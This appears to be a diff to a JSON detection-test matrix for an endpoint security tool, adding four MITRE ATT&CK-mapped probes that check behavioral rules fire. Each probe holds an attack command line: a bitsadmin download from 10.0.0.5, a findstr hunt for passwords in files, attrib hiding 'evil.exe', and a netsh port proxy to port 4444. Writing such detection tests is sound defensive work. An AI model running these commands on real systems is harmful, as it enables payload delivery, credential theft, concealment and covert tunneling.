@@ -969,6 +969,102 @@
       "requires": [],
       "notes": "Rules ADDED 2026-08-04 (was a genuine coverage hole). Two rules, since 'stop' (sc/net/Stop-Service) and 'disabled' (sc config / Set-Service -StartupType Disabled) are different command shapes; each requires BOTH the verb AND a security-relevant service name, so 'sc stop Spooler' and 'sc query WinDefend' both stay clear (regression controls in tests/test_behavioral_rules.py). NOTE the Tier B test-ref change: the probe now uses a REAL watched service name because the rule keys on that name -- so a live run must rename a DECOY service into the watched set rather than stopping a service called 'DecoySecurityService', which by design matches nothing. root_cause.py additionally proposes an artifact-at-rest Win32_Service state check; that remains unbuilt and would add poller-independent coverage for service stops performed WITHOUT a command line (e.g. via the Services MMC or an API call), which these command-shape rules cannot see.",
       "known_mismatch": ""
+    },
+    {
+      "id": "evasion-bits-transfer",
+      "technique_id": "T1197",
+      "technique_name": "BITS Jobs (bitsadmin transfer)",
+      "tactic": "Defense Evasion",
+      "art_test_ref": "T1197 Test #1",
+      "destructive": false,
+      "live_vm_safe": true,
+      "out_of_scope_reason": "",
+      "delivery": "realtime_etw",
+      "detector_path": "valkyrie/behavioral_rules.py: bitsadmin-transfer rule",
+      "predicted_tier_b": "DETECT",
+      "source_confidence": "confirmed_by_source_trace",
+      "probe": "ioa_rule",
+      "probe_input": {
+        "image": "bitsadmin.exe",
+        "parent": "cmd.exe",
+        "cmdline": "bitsadmin.exe /transfer job http://10.0.0.5/t.exe C:\\Users\\Public\\t.exe",
+        "path": ""
+      },
+      "requires": [],
+      "notes": "Verified via match_process (labels bitsadmin_transfer, download_cradle). bitsadmin ships on Windows.",
+      "known_mismatch": ""
+    },
+    {
+      "id": "cred-files-hunt",
+      "technique_id": "T1552.001",
+      "technique_name": "Unsecured Credentials: Credentials In Files (findstr)",
+      "tactic": "Credential Access",
+      "art_test_ref": "T1552.001 Test #1",
+      "destructive": false,
+      "live_vm_safe": true,
+      "out_of_scope_reason": "",
+      "delivery": "realtime_etw",
+      "detector_path": "valkyrie/behavioral_rules.py: cred-hunt rule",
+      "predicted_tier_b": "DETECT",
+      "source_confidence": "confirmed_by_source_trace",
+      "probe": "ioa_rule",
+      "probe_input": {
+        "image": "findstr.exe",
+        "parent": "cmd.exe",
+        "cmdline": "findstr /si password *.txt *.xml *.ini",
+        "path": ""
+      },
+      "requires": [],
+      "notes": "Verified via match_process (cred_hunt). findstr ships on Windows.",
+      "known_mismatch": ""
+    },
+    {
+      "id": "evasion-hidden-file",
+      "technique_id": "T1564.001",
+      "technique_name": "Hide Artifacts: Hidden Files and Directories (attrib +h +s)",
+      "tactic": "Defense Evasion",
+      "art_test_ref": "T1564.001 Test #1",
+      "destructive": false,
+      "live_vm_safe": true,
+      "out_of_scope_reason": "",
+      "delivery": "realtime_etw",
+      "detector_path": "valkyrie/behavioral_rules.py: hide-file rule",
+      "predicted_tier_b": "DETECT",
+      "source_confidence": "confirmed_by_source_trace",
+      "probe": "ioa_rule",
+      "probe_input": {
+        "image": "attrib.exe",
+        "parent": "cmd.exe",
+        "cmdline": "attrib.exe +h +s C:\\Users\\Public\\evil.exe",
+        "path": ""
+      },
+      "requires": [],
+      "notes": "Verified via match_process (hide_file). attrib ships on Windows.",
+      "known_mismatch": ""
+    },
+    {
+      "id": "c2-port-forward",
+      "technique_id": "T1090",
+      "technique_name": "Proxy (netsh portproxy)",
+      "tactic": "Command and Control",
+      "art_test_ref": "T1090 (netsh portproxy)",
+      "destructive": false,
+      "live_vm_safe": true,
+      "out_of_scope_reason": "",
+      "delivery": "realtime_etw",
+      "detector_path": "valkyrie/behavioral_rules.py: port-forward rule",
+      "predicted_tier_b": "DETECT",
+      "source_confidence": "confirmed_by_source_trace",
+      "probe": "ioa_rule",
+      "probe_input": {
+        "image": "netsh.exe",
+        "parent": "cmd.exe",
+        "cmdline": "netsh.exe interface portproxy add v4tov4 listenport=8080 connectaddress=10.0.0.5 connectport=4444",
+        "path": ""
+      },
+      "requires": [],
+      "notes": "Verified via match_process (port_forward). netsh ships on Windows.",
+      "known_mismatch": ""
     }
   ],
   "out_of_scope": [
